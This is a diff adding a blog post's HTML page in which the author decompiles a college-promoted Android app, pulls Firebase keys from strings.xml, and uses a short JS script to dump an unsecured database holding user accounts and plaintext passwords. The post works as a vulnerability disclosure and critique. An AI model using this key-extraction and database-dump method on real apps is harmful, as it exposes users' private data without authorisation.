@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="A few months back, my college sent every student an email asking us to download an app called YOL - YourOneLife which claims to be approved by AICTE. For those of you who don&#39;t know, AICTE stands for the All India Council for Technical Education. I don&#39;t exactly know what this council does but it comes under the Indian ministry of education so it must be something serious." />
+    <meta property="og:title" content="Hacking AICTE&#39;s &quot;Happiness App&quot;" />
+    <meta property="og:description" content="A few months back, my college sent every student an email asking us to download an app called YOL - YourOneLife which claims to be approved by AICTE. For those of you who don&#39;t know, AICTE stands for the All India Council for Technical Education. I don&#39;t exactly know what this council does but it comes under the Indian ministry of education so it must be something serious." />
+    <meta property="og:type" content="Hacking AICTE&#39;s &quot;Happiness App&quot;" />
+    <meta property="og:image" content="https://blog.ujwl.in/default.jpg" />
+    <meta property="og:url" content="https://blog.ujwl.in/hacking-aictes-happiness-app" />
+    <meta property="og:site_name" content="ujjujjuj's blog" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400&display=swap"
+      rel="stylesheet"
+    />
+    <title>Hacking AICTE's "Happiness App"</title>
+    <link rel="stylesheet" type="text/css" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark-dimmed.min.css"
+      integrity="sha512-zcatBMvxa7rT7dDklfjauWsfiSFParF+hRfCdf4Zr40/MmA1gkFcBRbop0zMpvYF3FmznYFgcL8wlcuO/GwHoA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+      integrity="sha512-bgHRAiTjGrzHzLyKOnpFvaEpGzJet3z4tZnXGjpsCcqOnAH6VGUx9frc5bcIhKTVLEiCO6vEhNAgx5jtLUYrfA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-NB6KYX6J7L"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "G-NB6KYX6J7L");
+    </script>
+  </head>
+  <body>
+    <div id="root">
+      <div onclick="window.history.back()" class="back">
+        <button>&lt;</button>
+        back
+      </div>
+      <hr />
+      <div class="blog">
+        <h1>Hacking AICTE's "Happiness App"</h1>
+        <p class="blog-info">
+          <a href="https://ujwl.in" target="_blank">ujjujjuj</a> on
+          2023-02-04
+        </p>
+        <p><p>A few months back, my college sent every student an email asking us to download an app called <em>YOL - YourOneLife</em> which claims to be approved by AICTE. For those of you who don&#39;t know, AICTE stands for the All India Council for Technical Education. I don&#39;t exactly know what this council does but it comes under the Indian ministry of education so it must be something serious.
+<br />
+<br />
+This app claims to have an <em>inbuilt AI</em> that will assess each institute&#39;s happiness index. 😱</p>
+<blockquote>
+<p>Students will have an opportunity to earn NFTs on the app. Students can redeem these NFTs after 6 months for various goodies and vouchers and even trade them for value.</p>
+</blockquote>
+<p>All of this looks pretty shady to me because they&#39;re using every buzzword that exists to market their app. This motivated me to dig deep into what this application actually does, so I decided to download and check it out myself.</p>
+<h2>First Look</h2>
+<p>As it turns out, the app is garbage. The text isn&#39;t even visible because its color is the same as the background color. I can&#39;t even figure out what to do to log in. Other people were also facing the same issue as evident from the Play Store reviews of this app.</p>
+<p>I don&#39;t think I&#39;ll be able to check out this app in the <em>conventional</em> way, so I decided to reverse-engineer it.</p>
+<h2>Reverse Engineering the App</h2>
+<p>I decided to use <a href="https://ibotpeaches.github.io/Apktool/">Apktool</a> to decompile the app. Apktool is a tool to reverse engineer 3rd party closed-source android apps. To be clear, it is not illegal to decompile an application. After downloading the APK file of the app, decompiling it was very easy</p>
+<pre><code class="language-plaintext">$ apktool d com.yol.apk
+
+I: Using Apktool 2.6.1 on com.yol.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: /home/ujjujjuj/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Baksmaling classes2.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+</code></pre>
+<p>The first file I went looking for is called <em>strings.xml</em>. It is where the app developer stores hardcoded strings - including database URLs, API keys, and other interesting stuff. This file had a database URL and Google API keys inside it.</p>
+<pre><code class="language-xml">&lt;string name=&quot;firebase_database_url&quot;&gt;https://XXXXX.firebaseio.com&lt;/string&gt;
+&lt;string name=&quot;google_api_key&quot;&gt;XXXXX&lt;/string&gt;
+&lt;string name=&quot;google_app_id&quot;&gt;XXXXX&lt;/string&gt;
+&lt;string name=&quot;project_id&quot;&gt;XXXXX&lt;/string&gt;
+&lt;string name=&quot;google_storage_bucket&quot;&gt;XXXXX.appspot.com&lt;/string&gt;
+</code></pre>
+<p>It is common for apps that use Firebase to store their keys in here. Some inexperienced developers forget to secure their firebase database by not setting up proper access permissions which could very well be the case here, so I decided to access Firebase using these keys.
+<br />
+<br />
+I wrote a script in JS to do just that</p>
+<pre><code class="language-js">import { initializeApp } from &quot;firebase/app&quot;;
+import { getDatabase, ref, onValue } from &quot;firebase/database&quot;;
+import fs from &quot;fs&quot;;
+
+const firebaseConfig = {
+  apiKey: &quot;XXXXX&quot;,
+  authDomain: &quot;XXXXX.firebaseapp.com&quot;,
+  databaseURL: &quot;https://XXXXX.firebaseio.com&quot;,
+  projectId: &quot;XXXXX&quot;,
+  storageBucket: &quot;XXXXX.appspot.com&quot;,
+};
+
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
+const dbRef = ref(database);
+onValue(dbRef, (ss) =&gt; {
+  console.log(&quot;downloaded snapshot&quot;);
+  fs.writeFile(&quot;data.json&quot;, JSON.stringify(ss.val(), null, 4), &quot;utf8&quot;, () =&gt; {
+    console.log(&quot;saved&quot;);
+    process.exit();
+  });
+});
+</code></pre>
+<p>And guess what, my suspicion was correct. The database was not configured properly and I was able to download all the data. I was able to download about 38MB of JSON data which contained user account data and posts. To my surprise, the user passwords were in <strong>plaintext</strong> and not hashed. This clearly showed that the application developer had no idea about security, or just had no regard for the safety of the users. </p>
+<h2>Conclusion</h2>
+<p>This is an easily preventable vulnerability. All you have to do is read the <a href="https://firebase.google.com/docs/firestore/solutions/role-based-access">firebase docs</a> about database rules. AICTE should re-evaluate its approval procedure to not allow such low-quality apps to pass.</p>
+</p>
+      </div>
+    </div>
+    <footer>
+      <div>
+        <p><a href="https://ujwl.in/" target="_blank">website</a></p>
+        <p><a href="https://www.buymeacoffee.com/ujjujjuj/" target="_blank">coffee?</a></p>
+        <p><a href="http://x.com/ujjujjuj/" target="_blank">twitter</a></p>
+      </div>
+    </footer>
+    <script>
+      hljs.highlightAll();
+      hljs.initLineNumbersOnLoad();
+      document
+        .querySelectorAll(".blog a")
+        .forEach((elem) => elem.setAttribute("target", "_blank"));
+    </script>
+  </body>
+</html>
